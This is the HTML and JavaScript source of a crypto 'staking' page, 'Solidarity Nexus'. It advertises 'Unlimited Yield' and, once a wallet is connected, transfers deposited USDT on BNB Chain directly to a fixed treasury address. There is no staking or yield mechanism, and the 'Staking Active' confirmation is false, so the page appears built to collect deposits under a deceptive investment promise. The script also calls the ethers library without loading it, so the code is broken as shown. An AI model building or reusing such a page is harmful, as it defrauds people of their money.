<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solidarity Nexus | Digital Community Stake</title>
    <!-- 1. CORRECT LIBRARY LOAD -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #050505; color: white; font-family: sans-serif; overflow-x: hidden; }
        .nexus-glow { text-shadow: 0 0 10px #00E5FF; color: #00E5FF; }
        .neon-card { border: 1px solid rgba(0, 229, 255, 0.3); box-shadow: 0 0 20px rgba(0, 229, 255, 0.1); }
        .btn-nexus { background: transparent; border: 1px solid #00E5FF; color: #00E5FF; transition: 0.3s; }
        .btn-nexus:hover { background: #00E5FF; color: black; box-shadow: 0 0 20px #00E5FF; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full p-8 rounded-[40px] neon-card text-center relative bg-black/90">
        
        <!-- THE LOGO -->
        <img src="logo.png" alt="SNX" class="w-48 h-48 mx-auto mb-6 drop-shadow-[0_0_15px_#00E5FF] object-contain">
        
        <h1 class="text-4xl font-bold nexus-glow mb-1 uppercase tracking-tighter">Solidarity Nexus</h1>
        <p class="text-[10px] tracking-[0.3em] text-gray-400 uppercase mb-8">Digital Community Stake • Unlimited Yield</p>

        <!-- 2. THE WALLET CONNECT (Fixed Logic) -->
        <div id="connect-container" class="relative z-10">
            <button id="connectBtn" onclick="walletConnect()" class="w-full py-5 rounded-2xl btn-nexus font-bold text-lg tracking-widest animate-pulse">
                INITIALIZE NEXUS WALLET
            </button>
        </div>

        <!-- 3. EXCHANGE DASHBOARD (Hidden until Connect) -->
        <div id="dashboard" class="hidden space-y-4 animate-in fade-in zoom-in duration-700">
            <div class="p-4 rounded-2xl bg-white/5 border border-white/10 flex justify-between items-center">
                <div class="text-left">
                    <p class="text-[10px] text-gray-500 uppercase">Primary Asset</p>
                    <h2 class="text-xl font-bold nexus-glow">$SNX TOKEN</h2>
                </div>
                <div class="text-right">
                    <span id="userAddr" class="text-[10px] text-gray-400 font-mono">0x00...0000</span>
                </div>
            </div>

            <div class="grid grid-cols-1 gap-3">
                <input type="number" id="depositAmount" placeholder="Amount USDT" class="w-full bg-transparent border-b border-gray-800 p-3 text-center focus:border-[#00E5FF] outline-none text-xl">
                <button onclick="depositUSDT()" class="w-full bg-[#00E5FF] text-black font-bold py-4 rounded-xl hover:scale-105 transition-transform">
                    DEPOSIT USDT BEP20
                </button>
            </div>
            <p class="text-[9px] text-gray-600 uppercase tracking-widest">Network: BNB Smart Chain (BEP20)</p>
        </div>
    </div>

    <!-- 4. ACCURATE JAVASCRIPT ENGINE -->
    <script>
        const TREASURY = "0xD36C336391AB88Df769491139cf5C791eC6C6feC";
        const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
        let signer;

        async function walletConnect() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    // Force the MetaMask Pop-up
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const account = accounts[0];
                    
                    // Initialize Provider
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    signer = provider.getSigner();

                    // UI Updates
                    document.getElementById('connect-container').classList.add('hidden');
                    document.getElementById('dashboard').classList.remove('hidden');
                    document.getElementById('userAddr').innerText = account.substring(0,6) + "..." + account.slice(-4);
                    
                    console.log("Nexus Connected:", account);
                } catch (error) {
                    alert("Connection Refused: " + error.message);
                }
            } else {
                alert("MetaMask not found! Please install the extension.");
            }
        }

        async function depositUSDT() {
            const amount = document.getElementById('depositAmount').value;
            if(!amount || amount <= 0) return alert("Enter valid amount");

            try {
                const usdtContract = new ethers.Contract(
                    USDT_BEP20, 
                    ["function transfer(address to, uint256 amount) public returns (bool)"], 
                    signer
                );
                
                const tx = await usdtContract.transfer(TREASURY, ethers.utils.parseUnits(amount, 18));
                alert("Transaction Sent! Waiting for confirmation...");
                await tx.wait();
                alert("Deposit Successful! $SNX Staking Active.");
            } catch (error) {
                alert("Transaction Failed: " + error.message);
            }
        }
    </script>
</body>
</html>
